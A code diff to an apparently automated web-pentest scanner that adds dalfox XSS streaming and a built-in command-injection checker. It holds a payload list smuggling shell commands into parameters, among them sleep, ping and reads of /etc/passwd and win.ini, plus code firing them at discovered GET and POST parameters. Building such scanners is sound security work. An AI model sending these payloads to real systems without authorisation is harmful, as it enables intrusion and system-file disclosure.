@@ -78,6 +78,33 @@ _XSS_PAYLOADS = [
     ("{canary}",                                     "reflection check"),
 ]
 
+# ── Built-in RCE payloads & canary ────────────────────────────────────────
+_RCE_CANARY = "rce_test_8888" # Expected output from math or echo
+_RCE_PAYLOADS = [
+    # Echo / Math (Resulting in 8888)
+    ("; echo $((9999-1111))", "Linux math echo semicolon"),
+    ("| echo $((9999-1111))", "Linux math echo pipe"),
+    ("|| echo $((9999-1111))", "Linux math echo OR"),
+    ("`echo $((9999-1111))`", "Linux math backtick"),
+    ("$(echo $((9999-1111)))", "Linux math subshell"),
+    ("; echo rce_test_8888", "Linux pure echo semicolon"),
+    ("| echo rce_test_8888", "Linux pure echo pipe"),
+    ("& echo rce_test_8888", "Windows pure echo ampersand"),
+    ("| echo rce_test_8888", "Windows pure echo pipe"),
+    # Time-based (sleeping 3 seconds)
+    ("; sleep 3", "Linux sleep semicolon"),
+    ("| sleep 3", "Linux sleep pipe"),
+    ("`sleep 3`", "Linux sleep backtick"),
+    ("$(sleep 3)", "Linux sleep subshell"),
+    ("; ping -c 3 127.0.0.1", "Linux ping delay"),
+    ("| ping -n 3 127.0.0.1", "Windows ping delay"),
+    # Basic file read (evidence in response)
+    ("; cat /etc/passwd", "Linux read passwd semicolon"),
+    ("| cat /etc/passwd", "Linux read passwd pipe"),
+    ("; type C:\\Windows\\win.ini", "Windows read win.ini semicolon"),
+    ("| type C:\\Windows\\win.ini", "Windows read win.ini pipe"),
+]
+
 # ── Security headers to check ─────────────────────────────────────────────
 _REQUIRED_HEADERS = {
     'Content-Security-Policy':   'Prevents XSS and data injection',
@@ -285,79 +312,159 @@ class URLVulnerabilityChecker:
                 for r, _, fs in os.walk(os.path.join(base, d)) for f in fs]
 
     # ── XSS / Dalfox ──────────────────────────────────────────────────────
-    def check_xss_with_dalfox(self):
+    def check_xss_with_dalfox(self,
+                               parallel_jobs: int = 5,
+                               url_timeout:   int = 60):
+        """
+        Fast XSS scan with dalfox.
+        parallel_jobs  – how many URLs are scanned simultaneously
+        url_timeout    – seconds before killing a stuck dalfox instance
+        """
         print("\n[+] Checking XSS with dalfox...")
-        script     = "/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/script/run_dalfox.sh"
-        out_file   = os.path.join(os.path.abspath(self.scan_dir), "dalfox_results.txt")
+        script   = "/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/script/run_dalfox.sh"
+        out_file = os.path.join(os.path.abspath(self.scan_dir), "dalfox_results.txt")
         os.makedirs(self.scan_dir, exist_ok=True)
+
+        # ── Load target URLs ──
         try:
             with open("xss_parameters.txt") as f:
                 urls = [l.strip() for l in f if l.strip()]
-            if not urls: print("[-] No URLs in xss_parameters.txt"); return False
-            print(f"    [*] {len(urls)} URLs | output: {out_file}")
+            if not urls:
+                print("    [-] No URLs in xss_parameters.txt"); return False
         except FileNotFoundError:
-            print("[-] xss_parameters.txt not found"); return False
+            print("    [-] xss_parameters.txt not found"); return False
         except Exception as e:
-            print(f"[-] Error: {e}"); return False
+            print(f"    [-] Error reading xss_parameters.txt: {e}"); return False
+
+        print(f"    [*] {len(urls)} URLs  parallel={parallel_jobs}  timeout={url_timeout}s/URL")
+        print(f"    [*] Output: {out_file}")
+
+        # ── Write URL list ──
+        if os.path.exists(out_file):
+            os.remove(out_file)
+        urls_file = os.path.join(os.path.abspath(self.scan_dir), "target_urls.txt")
+        with open(urls_file, 'w') as fh:
+            fh.write('\n'.join(urls) + '\n')
+
+        cmd = ['bash', script, urls_file, out_file,
+               str(parallel_jobs), str(url_timeout)]
+        print(f"    [*] Command: {' '.join(cmd)}")
+        print("    " + "-" * 50)
+
+        # ── Stream output live (no silent waiting) ──
+        t0 = time.time()
+        poc_live = 0
         try:
-            if os.path.exists(out_file): os.remove(out_file)
-            urls_file = os.path.join(os.path.abspath(self.scan_dir), "target_urls.txt")
-            open(urls_file, 'w').write('\n'.join(urls))
-            cmd = ['bash', script, urls_file, out_file]
-            print(f"    [*] Running: {' '.join(cmd)}\n    " + "-"*40)
-            res = subprocess.run(cmd, capture_output=True, text=True,
-                                 cwd=os.path.dirname(script))
-            for line in res.stdout.split('\n'):
-                if line.strip() and any(x in line.lower() for x in ['vulnerable','poc','xss','found','completed']):
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                cwd=os.path.dirname(script)
+            )
+            _SHOW_KEYWORDS = (
+                'vulnerable', 'poc', 'xss', '[!]', 'found',
+                'scanning', 'complete', 'error', '[-]', '[*]'
+            )
+            for raw_line in proc.stdout:
+                line = raw_line.rstrip()
+                if not line:
+                    continue
+                ll = line.lower()
+                # Always print progress + vulnerability lines; suppress dalfox noise
+                if any(kw in ll for kw in _SHOW_KEYWORDS):
                     print(f"        {line}")
-            print(f"    [*] rc={res.returncode}\n    " + "-"*40)
-            return self._process_dalfox_results(out_file)
+                    if '[poc]' in ll:
+                        poc_live += 1
+            proc.wait()
+            elapsed = time.time() - t0
+            print(f"    " + "-" * 50)
+            print(f"    [*] Scan finished in {elapsed:.1f}s  rc={proc.returncode}")
         except Exception as e:
             import traceback
-            print(f"    [-] dalfox error: {e}\n{traceback.format_exc()}"); return False
+            print(f"    [-] dalfox error: {e}")
+            traceback.print_exc()
+            return False
+
+        return self._process_dalfox_results(out_file)
 
     def _process_dalfox_results(self, output_file):
-        if not os.path.exists(output_file): print(f"    [-] Not found: {output_file}"); return False
+        if not os.path.exists(output_file):
+            print(f"    [-] Output file not found: {output_file}"); return False
         try:
             content = open(output_file, encoding='utf-8', errors='ignore').read().strip()
-            if not content: print("    [!] Output file empty"); return False
-            print("    [XSS ANALYSIS]:")
-            _patterns = [r'\[POC\]', r'\[V\].*vulnerable', r'triggered XSS',
-                         r'XSS found', r'Payload.*worked', r'Successfully.*injected']
+            if not content:
+                print("    [!] Output file is empty"); return False
+
+            print("\n    [XSS ANALYSIS]:")
+            _patterns = [
+                r'\[POC\]', r'\[V\].*vulnerable', r'triggered XSS',
+                r'XSS found', r'Payload.*worked', r'Successfully.*injected'
+            ]
             found = []
+            seen_evidence = set()
             for line in content.split('\n'):
                 lc = line.strip()
+                if not lc:
+                    continue
                 for pat in _patterns:
                     if re.search(pat, lc, re.I):
-                        if '--' in lc and 'http' not in lc: break
+                        # Skip separator lines that aren't real findings
+                        if '--' in lc and 'http' not in lc:
+                            break
+                        # Deduplicate identical lines
+                        if lc in seen_evidence:
+                            break
+                        seen_evidence.add(lc)
                         t = ("XSS (Stored)"    if '[S]' in lc or 'Stored' in lc else
-                             "XSS (DOM-based)" if '[DOM]' in lc or 'DOM' in lc else "XSS (Reflected)")
-                        m = re.search(r'https?://[^\s]+\?([^=]+)=', lc)
+                             "XSS (DOM-based)" if '[DOM]' in lc or 'DOM'   in lc else "XSS (Reflected)")
+                        m  = re.search(r'https?://[^\s]+\?([^=&\s]+)=', lc)
                         param = m.group(1) if m else 'unknown'
                         pm = re.search(r'FUZZ([^\s]+)', lc)
                         payload = urllib.parse.unquote(pm.group(1))[:100] if pm else 'dalfox_automated'
-                        found.append({'type': t, 'parameter': param, 'payload': payload,
-                                      'evidence': lc[:200], 'tool': 'dalfox', 'confidence': 'high'})
-                        print(f"        [!] VULNERABILITY: {lc}"); break
-            print(f"\n    [XSS SUMMARY]: {len(found)} total")
+                        found.append({
+                            'type': t, 'parameter': param,
+                            'payload': payload, 'evidence': lc[:200],
+                            'tool': 'dalfox', 'confidence': 'high'
+                        })
+                        print(f"        [!] {t} | param={param} | {lc[:120]}")
+                        break
+
+            # ── Summary ──
+            r_cnt = sum(1 for v in found if 'Reflected' in v['type'])
+            s_cnt = sum(1 for v in found if 'Stored'    in v['type'])
+            d_cnt = sum(1 for v in found if 'DOM'       in v['type'])
+            print(f"\n    {'='*50}")
+            print(f"    [XSS SUMMARY]  Total={len(found)}  "
+                  f"Reflected={r_cnt}  Stored={s_cnt}  DOM={d_cnt}")
+            print(f"    {'='*50}")
+
             if found:
                 self.vulnerabilities_found.extend(found)
-                r = sum(1 for v in found if 'Reflected' in v['type'])
-                s = sum(1 for v in found if 'Stored'    in v['type'])
-                d = sum(1 for v in found if 'DOM'       in v['type'])
-                print(f"        Reflected:{r}  Stored:{s}  DOM:{d}")
                 vf = os.path.join(self.scan_dir, "xss_vulnerabilities.txt")
                 with open(vf, 'w') as f:
-                    f.write("XSS VULNERABILITIES:\n" + "="*50 + "\n")
-                    for v in found:
-                        f.write(f"\nType:{v['type']}\nParam:{v['parameter']}\nPayload:{v['payload']}\n"
-                                f"Evidence:{v['evidence']}\nTool:{v['tool']}\nConf:{v['confidence']}\n" + "-"*50 + "\n")
-                print(f"    [+] Saved: {vf}")
+                    f.write("XSS VULNERABILITIES\n" + "=" * 50 + "\n")
+                    for i, v in enumerate(found, 1):
+                        f.write(
+                            f"\n#{i}\n"
+                            f"Type    : {v['type']}\n"
+                            f"Param   : {v['parameter']}\n"
+                            f"Payload : {v['payload']}\n"
+                            f"Evidence: {v['evidence']}\n"
+                            f"Tool    : {v['tool']}\n"
+                            f"Conf    : {v['confidence']}\n"
+                            + "-" * 50 + "\n"
+                        )
+                print(f"    [+] Saved vulnerability details: {vf}")
                 return True
-            print("    [-] No XSS found"); return False
+
+            print("    [-] No XSS vulnerabilities found")
+            return False
         except Exception as e:
-            import traceback; traceback.print_exc()
-            print(f"    [-] Error: {e}"); return False
+            import traceback
+            traceback.print_exc()
+            print(f"    [-] Error parsing results: {e}")
+            return False
 
     # ── Commix ────────────────────────────────────────────────────────────
     def check_command_injection_with_commix(self):
@@ -669,6 +776,85 @@ class URLVulnerabilityChecker:
                     vulns.append(res)
 
         print(f"    [*] Tested {tested} payloads → {len(vulns)} XSS finding(s)")
+        return vulns
+
+    # ── Built-in RCE checker ───────────────────────────────────────────────
+    def check_rce_builtin(self, url, targets=None):
+        """Test for remote code execution using echo, math, time delay, and file reads."""
+        print(f"\n[+] BUILT-IN RCE CHECK")
+        if not targets: targets = self.discover_parameters(url)
+        vulns = []
+        all_targets = [('get', t) for t in targets.get('get', [])] + [('post', t) for t in targets.get('post', [])]
+        if not all_targets:
+            print("    [-] No parameters to test"); return vulns
+
+        baseline = self._make_request(url)
+        base_time = baseline.elapsed.total_seconds() if baseline else 1
+        base_text = baseline.text if baseline else ""
+
+        import concurrent.futures
+
+        tasks = []
+        for method, target in all_targets:
+            turl, params = target['url'], target['params']
+            for param in params:
+                for payload, ptype in _RCE_PAYLOADS:
+                    tasks.append((method, turl, param, payload, ptype))
+        tested = len(tasks)
+
+        def _worker(task):
+            method, turl, param, payload, ptype = task
+            is_time_based = 'sleep' in ptype or 'ping' in ptype
+            try:
+                if method == 'post':
+                    t0 = time.time()
+                    r = self._make_request(turl, 'post', data={param: payload})
+                    elapsed = time.time() - t0
+                else:
+                    t0 = time.time()
+                    r = self._make_request(turl, params={param: payload})
+                    elapsed = time.time() - t0
+                if not r: return None
+
+                # Check for echo or math canary
+                if ('8888' in r.text and '8888' not in base_text) or ('rce_test_8888' in r.text and 'rce_test_8888' not in base_text):
+                    print(f"        [!] RCE FOUND: {param} ({ptype}) — Canary reflected")
+                    return {
+                        'type': f'Command Injection ({ptype})', 'parameter': param,
+                        'payload': payload, 'evidence': 'Command output (canary) found in response',
+                        'tool': 'builtin_rce', 'confidence': 'high',
+                        'url': turl, 'method': method
+                    }
+                
+                # Check for file read evidence (passwd or win.ini)
+                if 'root:x:0:0:' in r.text or '[extensions]' in r.text:
+                    print(f"        [!] RCE FOUND: {param} ({ptype}) — File content read")
+                    return {
+                        'type': f'Command Injection ({ptype})', 'parameter': param,
+                        'payload': payload, 'evidence': 'System file contents read (passwd/win.ini)',
+                        'tool': 'builtin_rce', 'confidence': 'high',
+                        'url': turl, 'method': method
+                    }
+
+                # Check for time delay
+                if is_time_based and elapsed > base_time + 2.5:
+                    print(f"        [!] RCE FOUND: {param} ({ptype}) — response delayed {elapsed:.1f}s")
+                    return {
+                        'type': f'Command Injection ({ptype})', 'parameter': param,
+                        'payload': payload, 'evidence': f'Response delayed {elapsed:.1f}s (baseline {base_time:.1f}s)',
+                        'tool': 'builtin_rce', 'confidence': 'medium',
+                        'url': turl, 'method': method
+                    }
+            except Exception:
+                pass
+            return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+             for res in executor.map(_worker, tasks):
+                 if res and not any(v['parameter'] == res['parameter'] and v['type'] == res['type'] for v in vulns):
+                     vulns.append(res)
+
+        print(f"    [*] Tested {tested} payloads → {len(vulns)} RCE finding(s)")
         return vulns
 
     # ── Security headers check ─────────────────────────────────────────────
@@ -997,6 +1183,9 @@ class URLVulnerabilityChecker:
 
         xss_vulns = self.check_xss_builtin(url, targets)
         builtin_vulns.extend(xss_vulns)
+
+        rce_vulns = self.check_rce_builtin(url, targets)
+        builtin_vulns.extend(rce_vulns)
 
         if builtin_vulns:
             self.vulnerabilities_found.extend(builtin_vulns)
